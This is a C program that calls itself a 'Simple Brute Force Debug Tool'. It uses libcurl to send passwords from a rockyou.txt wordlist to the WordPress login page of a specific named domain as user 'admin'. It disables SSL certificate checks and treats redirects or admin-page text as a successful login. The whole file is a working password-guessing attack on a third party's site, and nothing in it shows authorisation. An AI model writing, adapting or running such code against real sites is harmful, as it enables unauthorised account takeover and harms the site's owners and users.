#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#ifdef _WIN32
    #include <windows.h>
    #define sleep(x) Sleep(x * 1000)
#endif

#define MAX_PASSWORD_LEN 256

// Simple response structure
struct ResponseData {
    char *data;
    size_t size;
};

// Write callback function
static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    struct ResponseData *response = (struct ResponseData *)userp;
    size_t realsize = size * nmemb;
    
    char *ptr = realloc(response->data, response->size + realsize + 1);
    if (!ptr) {
        printf("Not enough memory (realloc returned NULL)\n");
        return 0;
    }
    
    response->data = ptr;
    memcpy(&(response->data[response->size]), contents, realsize);
    response->size += realsize;
    response->data[response->size] = 0;
    
    return realsize;
}

int main() {
    CURL *curl;
    CURLcode res;
    
    // Configuration
    const char *url = "https://transformatech.com/wp-login.php";
    const char *username = "admin";
    const char *wordlist_path = "C:\\Users\\veerk\\Downloads\\rockyou.txt";
    
    printf("Simple Brute Force Debug Tool\n");
    printf("Target: %s\n", url);
    printf("Username: %s\n", username);
    printf("Wordlist: %s\n\n", wordlist_path);
    
    // Open wordlist file
    FILE *f = fopen(wordlist_path, "r");
    if (f == NULL) {
        printf("ERROR: Failed to open wordlist file: %s\n", wordlist_path);
        printf("Please check the path and make sure the file exists.\n");
        return 1;
    }
    
    printf("Wordlist opened successfully.\n");
    
    // Initialize curl
    if (curl_global_init(CURL_GLOBAL_ALL) != 0) {
        printf("ERROR: Failed to initialize curl\n");
        fclose(f);
        return 1;
    }
    
    printf("Curl initialized successfully.\n");
    
    curl = curl_easy_init();
    if (!curl) {
        printf("ERROR: Failed to create curl handle\n");
        curl_global_cleanup();
        fclose(f);
        return 1;
    }
    
    printf("Curl handle created successfully.\n");
    
    // Set curl options
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
    
    // Disable SSL verification for testing
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    printf("Curl options set. Starting password attempts...\n\n");
    
    char password[MAX_PASSWORD_LEN];
    int attempt_count = 0;
    int max_attempts = 10; // Limit for debugging
    
    while (fgets(password, sizeof(password), f) && attempt_count < max_attempts) {
        // Clean the password
        password[strcspn(password, "\r\n")] = '\0';
        
        if (strlen(password) == 0) continue;
        
        attempt_count++;
        
        printf("Attempt %d: Testing password '%s'\n", attempt_count, password);
        
        // Prepare response structure
        struct ResponseData response = {0};
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        
        // Format POST data
        char postfields[512];
        snprintf(postfields, sizeof(postfields),
                "log=%s&pwd=%s&wp-submit=Log+In&testcookie=1",
                username, password);
        
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
        
        // Perform the request
        res = curl_easy_perform(curl);
        
        if (res != CURLE_OK) {
            printf("  ERROR: %s\n", curl_easy_strerror(res));
        } else {
            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
            
            printf("  HTTP Code: %ld\n", http_code);
            
            if (response.data) {
                printf("  Response size: %zu bytes\n", response.size);
                
                // Check for success indicators
                if (http_code == 302) {
                    printf("  POTENTIAL SUCCESS: Got redirect (302)\n");
                } else if (strstr(response.data, "wp-admin") || 
                          strstr(response.data, "dashboard")) {
                    printf("  POTENTIAL SUCCESS: Found admin content\n");
                } else if (strstr(response.data, "incorrect") || 
                          strstr(response.data, "invalid")) {
                    printf("  FAILED: Login error message found\n");
                } else {
                    printf("  UNKNOWN: No clear success/failure indicators\n");
                }
                
                free(response.data);
            }
        }
        
        printf("\n");
        sleep(1); // 1 second delay between attempts for debugging
    }
    
    printf("Debug test completed. Attempted %d passwords.\n", attempt_count);
    
    // Cleanup
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    fclose(f);
    
    return 0;
}